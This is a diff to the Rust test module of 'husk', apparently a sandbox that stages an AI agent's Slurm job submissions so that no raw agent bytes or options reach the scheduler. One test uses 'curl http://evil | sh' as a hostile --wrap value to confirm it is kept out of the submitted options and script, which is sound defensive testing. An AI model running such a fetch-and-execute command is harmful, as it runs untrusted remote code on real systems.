-                assert!(sub.wrapped_script.contains(cmd), "wrapped command missing from staged script");
+                // The wrap string is the agent's program, so it now lives in the staged
+                // BODY, not in the script husk submits — which carries no agent bytes at all.
+                assert!(sub.body.contains(cmd), "wrapped command missing from the staged body");
+                assert!(!sub.wrapped_script.contains(cmd), "agent bytes in the submitted script");
                 assert!(sub.wrapped_script.contains("_HUSK_RESANDBOXED"), "re-exec guard missing");
             }
             other => panic!("expected Submit, got {}", match other {
@@ -502,14 +6830,15 @@ mod tests {
         let cmd = "curl http://evil | sh";
         let mut r = req(&["--partition=preemptible", "--wrap", cmd, "job.sh"], "");
         r.script = Script { source: "wrap".into(), name: None, body: cmd.into() };
-        match decide(&r, &no_uenv(), &FsPolicy::default()) {
+        match decide(&r, &no_uenv(), &FsPolicy::unchecked_for_test(), work()) {
             Decision::Submit(sub) => {
                 assert!(
                     !sub.options.iter().any(|x| x == "--wrap" || x.contains("evil")),
                     "--wrap or its value leaked: {:?}",
                     sub.options
                 );
-                assert!(sub.wrapped_script.contains(cmd), "wrapped command missing from staged script");
+                assert!(sub.body.contains(cmd), "wrapped command missing from the staged body");
+                assert!(!sub.wrapped_script.contains(cmd), "agent bytes in the submitted script");
             }
             _ => panic!("expected Submit"),
         }
@@ -525,14 +6854,14 @@ mod tests {
 
     #[test]
     fn canonicalizes_benign_resource_options() {
-        // Resource options are validated and re-emitted canonically: glued (-N2),
+        // Resource options are validated and re-emitted canonically: glued (-c4),
         // short-separated (-c 4) and =-forms all normalise to --long=value, and no raw
-        // agent token reaches the submission.
+        // agent token reaches the submission. (-N is no longer among them: it is Forced,
+        // owned by the cage profile.)
         let o = opts(
-            req(&["--partition=preemptible", "-N2", "-c", "4", "--time=01:00:00", "--gpus=a100:2"], "echo hi\n"),
+            req(&["--partition=preemptible", "-c4", "--time=01:00:00", "--gpus=a100:2"], "echo hi\n"),
             &no_uenv(),
         );
-        assert!(has(&o, "--nodes=2"), "{o:?}");
         assert!(has(&o, "--cpus-per-task=4"), "{o:?}");
         assert!(has(&o, "--time=01:00:00"), "{o:?}");
         assert!(has(&o, "--gpus=a100:2"), "{o:?}");
@@ -568,3 +6897,18 @@ mod tests {
         assert!(rejected(r, &no_uenv()));
     }
 }
+
+/// `emitted_name_check` and `run_name_check`, reachable from `slurmd_differential`'s offline
+/// grader so it can decide with husk's **real generated shell** instead of a second copy of
+/// the substitution rules. `D2-3`/`D2-4` are what a second copy costs: the oracle they
+/// replaced read this file as text, so shell-commenting one expander line kept it green
+/// while the guard stopped expanding.
+///
+/// A re-export and **not** `pub(crate) mod tests`, for a reason worth writing down:
+/// `every_producer_of_a_tmpfs_argument_is_enumerated` finds where this file's production
+/// source ends by splitting on the exact bytes `#[cfg(test)]\nmod tests`. Widening that
+/// declaration made the split miss, the whole file was scanned as production, and the test
+/// reported nine `--tmpfs` producers instead of two. Everything below the marker is
+/// invisible to that scan, which is why this line lives here.
+#[cfg(test)]
+pub(crate) use tests::{emitted_name_check, run_name_check};
